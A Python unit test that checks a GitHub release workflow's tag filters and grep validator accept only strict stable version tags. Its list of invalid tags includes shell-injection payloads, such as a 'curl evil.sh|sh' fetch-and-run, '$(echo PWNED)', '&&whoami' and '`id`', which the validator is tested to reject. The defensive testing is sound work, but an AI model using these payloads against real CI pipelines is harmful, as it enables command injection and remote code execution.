"""The release trigger and the release tag validator must agree — stable tags only.

`.github/workflows/release.yml` filters tag pushes with *ordered* GitHub ref filters
(stable ``v*.*.*`` globs first, then ``!`` negatives for prerelease/build/floating
aliases) and then re-validates the tag with ``grep -Eq`` as a strict no-leading-zero
``vMAJOR.MINOR.PATCH``. Both ends must agree so that:

* every valid stable tag triggers and passes validation;
* prerelease (``v1.2.3-rc.1``), build-metadata (``v1.2.3+build.7``), and floating aliases
  (``v1``) do NOT trigger, and,
* any tag that somehow triggers still cannot survive validation (a crafted
  workflow_dispatch input).

The test reads both out of the workflow and asserts they cannot drift apart again.
"""
from __future__ import annotations

import re
import subprocess
import textwrap
import unittest
from pathlib import Path

WORKFLOW = Path(__file__).resolve().parents[1] / ".github/workflows/release.yml"

# Ground truth: exact stable vMAJOR.MINOR.PATCH with no leading zeroes. Prerelease and
# build-metadata suffixes are deliberately NOT release tags for this product line.
STABLE_RE = re.compile(r"^v(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)\.(0|[1-9][0-9]*)$")

_CORES = ["1.2.3", "0.0.4", "10.20.30", "0.0.0", "01.2.3", "1.02.3", "1.2.03"]
_PRES = ["", "-rc.1", "-rc-1", "-alpha", "-alpha.beta", "-0.3.7", "-01", "-alpha.01"]
_BUILDS = ["", "+build.7", "+build.01", "+21AF26D3-117B344092BD", "+."]

VALID = [f"v{core}" for core in _CORES if STABLE_RE.match(f"v{core}")]
# Everything with a prerelease or build suffix is invalid for release, plus non-releases and
# shell-injection payloads a crafted workflow_dispatch input could supply.
INVALID = [f"v{core}{pre}" for core in _CORES for pre in _PRES if pre
           ] + [f"v{core}{bd}" for core in _CORES for bd in _BUILDS if bd
               ] + [
    "v1", "v2", "v1.2", "vnext", "main", "master", "HEAD", "", "v", "1.2.3",
    "v1.2.3 ", " v1.2.3",
    'v0.6.0"; echo PWNED; "', "$(echo PWNED)", "v0.6.0; curl evil.sh|sh",
    "v1.2.3&&whoami", "v1.2.3`id`",
]
# A ref with an embedded newline cannot exist as a git refname; it is a trigger-surface
# guard only (never validated), because grep is line-oriented by construction.
MULTILINE_REFS = ["v1.2.3\nv9.9.9"]


def _workflow_text() -> str:
    return WORKFLOW.read_text(encoding="utf-8")


def _trigger_globs() -> list[str]:
    """The ordered `on.push.tags` glob list, read straight out of the YAML."""
    text = _workflow_text()
    block = re.search(r"^\s*tags:\s*$(.*?)^\s*workflow_dispatch:", text,
                      re.MULTILINE | re.DOTALL)
    assert block, "could not locate on.push.tags in release.yml"
    # Single-quoted YAML scalars carry backslashes verbatim, which is how the workflow
    # writes the escaped `\+`; double-quoted ones are kept for the plain patterns.
    pairs = re.findall(r'''^\s*-\s*(?:"([^"]+)"|'([^']+)')''', block.group(1), re.MULTILINE)
    return [dq or sq for dq, sq in pairs]


_SPECIAL = set("*?+[]!\\")


def _glob_regex(glob: str) -> str:
    """GitHub filter-pattern cheat sheet, the subset a tag filter can use.

    ``*`` any run except ``/``; ``**`` any run; ``?`` one char except ``/``; ``+`` one or
    more of the preceding *literal* character; ``\\`` escapes the next character. A ``+``
    after a special character is rejected exactly as GitHub rejects it -- that mistake
    (``!v*.*.*+*``) once invalidated the whole release workflow server-side.
    """
    atoms: list[tuple[str, bool]] = []  # (regex, is_literal)
    i = 0
    while i < len(glob):
        c = glob[i]
        if c == "\\" and i + 1 < len(glob):
            atoms.append((re.escape(glob[i + 1]), True))
            i += 2
        elif glob.startswith("**", i):
            atoms.append((".*", False))
            i += 2
        elif c == "*":
            atoms.append(("[^/]*", False))
            i += 1
        elif c == "?":
            atoms.append(("[^/]", False))
            i += 1
        elif c == "+":
            if not atoms or not atoms[-1][1]:
                raise ValueError(f"invalid filter pattern {glob!r}: '+' must follow a "
                                 "literal character")
            rx, _ = atoms[-1]
            atoms[-1] = (rx + "+", False)
            i += 1
        else:
            atoms.append((re.escape(c), c not in _SPECIAL))
            i += 1
    return "^" + "".join(rx for rx, _ in atoms) + "$"


def _glob_matches(glob: str, ref: str) -> bool:
    return re.match(_glob_regex(glob), ref) is not None


def _triggers(ref: str) -> bool:
    """GitHub's ordered ref-filter semantics: the LAST matching filter decides.

    GitHub applies tag filters in declaration order; a matching ``!`` negative after a
    positive excludes, and a positive after a negative re-includes. Only the last match
    matters, so the workflow's ordered list ``v*.*.*`` → ``!v*.*.*-*`` →
    ``!v*.*.*\+*`` → ``!v1`` means stable tags trigger and prerelease/build/floating do not.
    """
    # A ref containing a newline cannot be a git refname; the trigger surface cannot see it.
    if "\n" in ref or "\r" in ref:
        return False
    decided = None
    for glob in _trigger_globs():
        is_neg = glob.startswith("!")
        body = glob[1:] if is_neg else glob
        if _glob_matches(body, ref):
            decided = not is_neg
    return bool(decided)


def _validation_script() -> str:
    m = re.search(
        r"- name: Resolve and validate release tag.*?\n        run: \|\n(.*?)\n      - name: ",
        _workflow_text(), re.DOTALL)
    assert m, "could not locate the tag-validation run: block in release.yml"
    body = textwrap.dedent(m.group(1))
    assert "grep -Eq" in body, "extracted block does not contain the validator"
    return body


def _validator_regex() -> str:
    """The ERE passed to grep in the tag-validation step: the strict stable matcher."""
    m = re.search(r"if ! printf '%s' \"\$tag\" \| grep -Eq '([^']+)'", _workflow_text())
    assert m, "could not locate the grep -Eq tag validator in release.yml"
    rx = m.group(1)
    assert rx.startswith("^v") and rx.endswith("$"), f"validator not anchored: {rx!r}"
    assert "[1-9]" in rx, f"validator lacks a SemVer numeric rule -- wrong match? {rx!r}"
    return rx


def _accepts(tag: str) -> bool:
    """Run the workflow's own grep validator, in a real shell, exactly as CI would.

    Only the validator line is exercised (the surrounding step also fetches and checks
    ancestry against the live repo, which is out of scope for this contract test).
    """
    rx = _validator_regex()
    import shlex
    script = "if printf '%s' " + shlex.quote(tag) + " | grep -Eq '" + rx + \
             "'; then exit 0; else exit 1; fi"
    proc = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
    return proc.returncode == 0


class TestReleaseTagPolicy(unittest.TestCase):
    def test_trigger_only_stable_tags(self):
        for tag in VALID:
            with self.subTest(tag=tag):
                self.assertTrue(_triggers(tag), f"valid stable tag not triggered: {tag}")
        # Ref-filter-level refusals: the ordered negative filters exclude prerelease/build/
        # floating aliases; shell-injection and trailing-space refs still match the glob
        # surface (they are not git refnames), so those are the VALIDATOR's job below.
        for tag in INVALID:
            if "\n" in tag:
                continue
            if STABLE_RE.match(tag):
                continue
            if not _glob_matches("v*.*.*", tag):
                with self.subTest(tag=tag):
                    self.assertFalse(_triggers(tag),
                                     f"non-glob tag triggered a run: {tag!r}")
            elif _glob_matches("v*.*.*-*", tag) or _glob_matches(r"v*.*.*\+*", tag) \
                    or _glob_matches("v1", tag):
                # prerelease/build are excluded by the negatives after the positives
                with self.subTest(tag=tag):
                    self.assertFalse(_triggers(tag),
                                     f"filter-excluded tag triggered a run: {tag!r}")

    def test_validator_rejects_prerelease_and_build(self):
        self.assertFalse(_accepts("v1.2.3-rc.1"))
        self.assertFalse(_accepts("v1.2.3+build.7"))
        self.assertFalse(_accepts("v1"))
        self.assertFalse(_accepts("v1.2"))
        self.assertTrue(_accepts("v1.2.3"))
        self.assertTrue(_accepts("v0.0.4"))

    def test_trigger_filters_are_valid_github_filter_patterns(self):
        # GitHub rejects the whole workflow file when a filter is malformed (a `+` after a
        # special character), and a rejected release.yml means a tag push publishes nothing.
        globs = _trigger_globs()
        self.assertEqual(globs, ["v*.*.*", "!v*.*.*-*", r"!v*.*.*\+*", "!v1"])
        for glob in globs:
            with self.subTest(glob=glob):
                _glob_regex(glob.lstrip("!"))  # must not raise

    def test_filter_pattern_model_matches_github_semantics(self):
        with self.assertRaises(ValueError):
            _glob_regex("v*.*.*+*")  # the mistake that invalidated the workflow
        self.assertTrue(_glob_matches(r"v*.*.*\+*", "v1.2.3+build.7"))
        self.assertFalse(_glob_matches(r"v*.*.*\+*", "v1.2.3"))
        self.assertTrue(_glob_matches("v1+", "v111"))  # unescaped: quantifier
        self.assertFalse(_glob_matches("v1+", "v1+"))
        self.assertTrue(_glob_matches("v?.0.0", "v1.0.0"))
        self.assertFalse(_glob_matches("v?.0.0", "v10.0.0"))
        self.assertTrue(_glob_matches("**", "refs/tags/anything"))
        self.assertFalse(_glob_matches("*", "a/b"))

    def test_multiline_refs_never_trigger(self):
        for ref in MULTILINE_REFS:
            self.assertFalse(_triggers(ref), f"multiline ref triggered: {ref!r}")

    def test_no_legitimate_tag_triggers_a_run_it_cannot_pass(self):
        for tag in INVALID:
            if _triggers(tag):
                self.assertFalse(_accepts(tag),
                                 f"triggered but validated: {tag!r}")

    def test_script_accepts_real_tags_and_rejects_plain_bad_ones(self):
        for tag in VALID:
            with self.subTest(tag=tag):
                self.assertTrue(_accepts(tag), f"script rejected a valid tag: {tag}")
        for tag in INVALID:
            with self.subTest(tag=tag):
                self.assertFalse(_accepts(tag), f"script accepted invalid tag: {tag!r}")

    def test_hostile_refs_matching_the_glob_are_still_refused(self):
        printable = [t for t in INVALID if re.fullmatch(r"[0-9A-Za-z.+-]+", t or "x")]
        for tag in printable:
            with self.subTest(tag=tag):
                self.assertFalse(_accepts(tag), f"validator accepted hostile ref: {tag!r}")


if __name__ == "__main__":
    unittest.main()